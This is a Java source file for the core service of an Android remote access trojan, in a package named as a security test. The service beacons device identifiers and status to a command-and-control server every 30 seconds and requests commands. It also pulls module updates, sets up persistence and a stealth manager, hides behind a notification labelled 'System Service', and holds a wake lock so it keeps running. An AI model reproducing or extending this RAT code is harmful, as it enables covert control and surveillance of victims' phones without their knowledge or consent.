package com.security.test.rat.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.security.test.rat.MainActivity;
import com.security.test.rat.R;
import com.security.test.rat.modules.ModuleManager;
import com.security.test.rat.network.C2Client;
import com.security.test.rat.persistence.PersistenceManager;
import com.security.test.rat.utils.StealthManager;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * CoreService - Main RAT service orchestrating all operations
 * 
 * This service runs in the background and manages:
 * - Module loading and execution
 * - C2 communication
 * - Persistence mechanisms
 * - Command scheduling
 * - System monitoring
 */
public class CoreService extends Service {
    
    private static final String TAG = "CoreService";
    
    // Service actions
    public static final String ACTION_START = "com.security.test.rat.START";
    public static final String ACTION_STOP = "com.security.test.rat.STOP";
    public static final String ACTION_RESTART = "com.security.test.rat.RESTART";
    
    // Notification constants
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "com.security.test.rat.CORE_SERVICE";
    private static final String CHANNEL_NAME = "System Service";
    
    // Service state
    private boolean isRunning = false;
    private boolean isInitialized = false;
    
    // Core components
    private ModuleManager moduleManager;
    private C2Client c2Client;
    private PersistenceManager persistenceManager;
    private StealthManager stealthManager;
    
    // Background execution
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;
    
    // Power management
    private PowerManager.WakeLock wakeLock;
    
    // Configuration
    private static final int BEACON_INTERVAL = 30; // seconds
    private static final int HEALTH_CHECK_INTERVAL = 60; // seconds
    private static final int MODULE_UPDATE_INTERVAL = 300; // seconds
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "CoreService created");
        
        // Initialize components
        initializeComponents();
        
        // Create notification channel (Android 8.0+)
        createNotificationChannel();
        
        // Acquire wake lock
        acquireWakeLock();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CoreService started with intent: " + intent);
        
        if (intent != null) {
            String action = intent.getAction();
            
            switch (action) {
                case ACTION_START:
                    startService();
                    break;
                case ACTION_STOP:
                    stopService();
                    break;
                case ACTION_RESTART:
                    restartService();
                    break;
                default:
                    startService();
                    break;
            }
        } else {
            startService();
        }
        
        // Return START_STICKY to restart service if killed
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        // This service doesn't support binding
        return null;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "CoreService destroyed");
        
        // Cleanup resources
        cleanup();
        
        super.onDestroy();
    }
    
    /**
     * Initialize all core components
     */
    private void initializeComponents() {
        try {
            // Initialize managers
            moduleManager = new ModuleManager(this);
            c2Client = new C2Client(this);
            persistenceManager = new PersistenceManager(this);
            stealthManager = new StealthManager(this);
            
            // Initialize main handler
            mainHandler = new Handler(Looper.getMainLooper());
            
            // Initialize scheduler
            scheduler = Executors.newScheduledThreadPool(3);
            
            Log.d(TAG, "Core components initialized successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize core components", e);
        }
    }
    
    /**
     * Start the RAT service
     */
    private void startService() {
        if (isRunning) {
            Log.d(TAG, "Service already running");
            return;
        }
        
        try {
            Log.d(TAG, "Starting RAT service...");
            
            // Start foreground service with notification
            startForeground(NOTIFICATION_ID, createNotification());
            
            // Initialize persistence mechanisms
            persistenceManager.initialize();
            
            // Initialize modules
            moduleManager.initialize();
            
            // Initialize C2 communication
            c2Client.initialize();
            
            // Start background tasks
            startBackgroundTasks();
            
            // Mark service as running
            isRunning = true;
            isInitialized = true;
            
            Log.d(TAG, "RAT service started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to start RAT service", e);
            stopSelf();
        }
    }
    
    /**
     * Stop the RAT service
     */
    private void stopService() {
        if (!isRunning) {
            Log.d(TAG, "Service not running");
            return;
        }
        
        try {
            Log.d(TAG, "Stopping RAT service...");
            
            // Stop background tasks
            stopBackgroundTasks();
            
            // Cleanup modules
            if (moduleManager != null) {
                moduleManager.cleanup();
            }
            
            // Cleanup C2 client
            if (c2Client != null) {
                c2Client.cleanup();
            }
            
            // Cleanup persistence
            if (persistenceManager != null) {
                persistenceManager.cleanup();
            }
            
            // Mark service as stopped
            isRunning = false;
            isInitialized = false;
            
            Log.d(TAG, "RAT service stopped successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping RAT service", e);
        }
    }
    
    /**
     * Restart the RAT service
     */
    private void restartService() {
        Log.d(TAG, "Restarting RAT service...");
        
        stopService();
        
        // Wait a moment before restarting
        mainHandler.postDelayed(this::startService, 1000);
    }
    
    /**
     * Start background tasks
     */
    private void startBackgroundTasks() {
        try {
            // Start beacon task
            scheduler.scheduleAtFixedRate(
                this::sendBeacon,
                0,
                BEACON_INTERVAL,
                TimeUnit.SECONDS
            );
            
            // Start health check task
            scheduler.scheduleAtFixedRate(
                this::performHealthCheck,
                0,
                HEALTH_CHECK_INTERVAL,
                TimeUnit.SECONDS
            );
            
            // Start module update task
            scheduler.scheduleAtFixedRate(
                this::updateModules,
                0,
                MODULE_UPDATE_INTERVAL,
                TimeUnit.SECONDS
            );
            
            Log.d(TAG, "Background tasks started");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to start background tasks", e);
        }
    }
    
    /**
     * Stop background tasks
     */
    private void stopBackgroundTasks() {
        try {
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                
                // Wait for tasks to complete
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            }
            
            Log.d(TAG, "Background tasks stopped");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping background tasks", e);
        }
    }
    
    /**
     * Send beacon to C2 server
     */
    private void sendBeacon() {
        try {
            if (c2Client != null && c2Client.isConnected()) {
                JSONObject beacon = createBeaconData();
                c2Client.sendBeacon(beacon);
                
                Log.d(TAG, "Beacon sent successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to send beacon", e);
        }
    }
    
    /**
     * Create beacon data
     */
    private JSONObject createBeaconData() {
        try {
            JSONObject beacon = new JSONObject();
            
            // Basic device information
            beacon.put("device_id", stealthManager.getDeviceId());
            beacon.put("timestamp", System.currentTimeMillis());
            beacon.put("version", "1.0.0");
            
            // System status
            beacon.put("battery_level", stealthManager.getBatteryLevel());
            beacon.put("network_type", stealthManager.getNetworkType());
            beacon.put("is_charging", stealthManager.isCharging());
            
            // Module status
            if (moduleManager != null) {
                beacon.put("modules", moduleManager.getModuleStatus());
            }
            
            // Request commands
            beacon.put("request_commands", true);
            
            return beacon;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to create beacon data", e);
            return new JSONObject();
        }
    }
    
    /**
     * Perform health check
     */
    private void performHealthCheck() {
        try {
            Log.d(TAG, "Performing health check...");
            
            // Check module health
            if (moduleManager != null) {
                moduleManager.performHealthCheck();
            }
            
            // Check C2 connection
            if (c2Client != null) {
                c2Client.checkConnection();
            }
            
            // Check persistence mechanisms
            if (persistenceManager != null) {
                persistenceManager.checkHealth();
            }
            
            // Check system resources
            checkSystemResources();
            
            Log.d(TAG, "Health check completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Health check failed", e);
        }
    }
    
    /**
     * Check system resources
     */
    private void checkSystemResources() {
        try {
            // Check memory usage
            Runtime runtime = Runtime.getRuntime();
            long usedMemory = runtime.totalMemory() - runtime.freeMemory();
            long maxMemory = runtime.maxMemory();
            double memoryUsage = (double) usedMemory / maxMemory * 100;
            
            if (memoryUsage > 80) {
                Log.w(TAG, "High memory usage: " + String.format("%.1f%%", memoryUsage));
                // Trigger garbage collection
                System.gc();
            }
            
            // Check battery level
            int batteryLevel = stealthManager.getBatteryLevel();
            if (batteryLevel < 20) {
                Log.w(TAG, "Low battery level: " + batteryLevel + "%");
                // Reduce activity to conserve battery
                reduceActivity();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to check system resources", e);
        }
    }
    
    /**
     * Reduce activity to conserve resources
     */
    private void reduceActivity() {
        try {
            // Increase beacon interval
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.scheduleAtFixedRate(
                    this::sendBeacon,
                    BEACON_INTERVAL * 2,
                    BEACON_INTERVAL * 2,
                    TimeUnit.SECONDS
                );
            }
            
            // Disable non-critical modules
            if (moduleManager != null) {
                moduleManager.disableNonCriticalModules();
            }
            
            Log.d(TAG, "Activity reduced to conserve resources");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to reduce activity", e);
        }
    }
    
    /**
     * Update modules
     */
    private void updateModules() {
        try {
            Log.d(TAG, "Checking for module updates...");
            
            if (moduleManager != null) {
                moduleManager.checkForUpdates();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to update modules", e);
        }
    }
    
    /**
     * Create notification channel (Android 8.0+)
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            );
            
            channel.setDescription("System service notification");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }
    
    /**
     * Create persistent notification
     */
    private Notification createNotification() {
        // Create intent for notification tap
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        );
        
        // Build notification
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running system processes")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false);
        
        return builder.build();
    }
    
    /**
     * Acquire wake lock to keep service running
     */
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "CoreService::WakeLock"
                );
                wakeLock.acquire();
                Log.d(TAG, "Wake lock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
    }
    
    /**
     * Release wake lock
     */
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, "Wake lock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to release wake lock", e);
        }
    }
    
    /**
     * Cleanup resources
     */
    private void cleanup() {
        try {
            // Release wake lock
            releaseWakeLock();
            
            // Stop background tasks
            stopBackgroundTasks();
            
            // Cleanup components
            if (moduleManager != null) {
                moduleManager.cleanup();
            }
            
            if (c2Client != null) {
                c2Client.cleanup();
            }
            
            if (persistenceManager != null) {
                persistenceManager.cleanup();
            }
            
            Log.d(TAG, "Cleanup completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup", e);
        }
    }
    
    /**
     * Get service status
     */
    public boolean isRunning() {
        return isRunning;
    }
    
    /**
     * Get initialization status
     */
    public boolean isInitialized() {
        return isInitialized;
    }
}
